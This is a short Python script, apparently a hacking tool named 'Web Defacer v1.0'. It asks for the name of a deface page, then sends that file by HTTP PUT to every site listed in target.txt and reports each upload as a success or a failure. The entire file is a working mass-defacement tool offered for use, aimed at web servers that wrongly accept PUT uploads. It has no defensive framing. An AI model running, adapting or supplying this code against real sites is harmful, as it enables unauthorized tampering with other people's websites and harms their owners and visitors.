__Author__ = "Axeyed Tran"
__Version__ = "1.0"
#=====Settting=====#
try:
    import requests
except ImportError:
    print('[!] requests module is not installed')
    os.sys.exit()
import requests, os.path, sys, os
def x(content):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(content)
    else:
        ipt = raw_input(content)

    return str(ipt)
#=====Banner=====#
banner = """
=======================================================
 _ _ _ ____ ___     ___  ____ ____ ____ ____ ____ ____ 
 | | | |___ |__]    |  \ |___ |___ |__| |    |___ |__/ 
 |_|_| |___ |__]    |__/ |___ |    |  | |___ |___ |  \ 
=======================================================
                Web Defacer v1.0         @AxeyedTran
 """
#=====Upload Runner=====#
def run(script, target_file="target.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        s = requests.Session()
        print("=======================================================")
        print("[*] Uploading file...")
        print("=======================================================")
        for web in target:
                try:
                    site = web.strip()
                    if site.startswith("http://") is False:
                        site = "http://" + site
                    req = s.put(site + "/" + script, data=op)
                    if req.status_code < 200 or req.status_code >= 250:
                        print("Axeyed => [Upload Failed] => %s/%s" % (site, script))
                    else:
                        print("Axeyed => [Upload Success] => %s/%s" % (site, script))
                    print("=======================================================")

                except requests.exceptions.RequestException:
                    continue
                except KeyboardInterrupt:
                    print('[!] Error')
                    os.sys.exit()


def main(banner_scr):
    os.system("cls" if os.name == "nt" else "clear")
    print(banner_scr)
    print("=======================================================")
    print("[*] Edit Url in target.txt")
    print("=======================================================")
    while True:
        try:
            b = x("[?] Enter your script deface name: ")
            if not os.path.isfile(b):
                print("[!] File '%s' not found" % (b))
                continue
            else:
                break
            
        except KeyboardInterrupt:
            os.sys.exit()
    
    run(b)


if __name__ == "__main__":
    main(banner)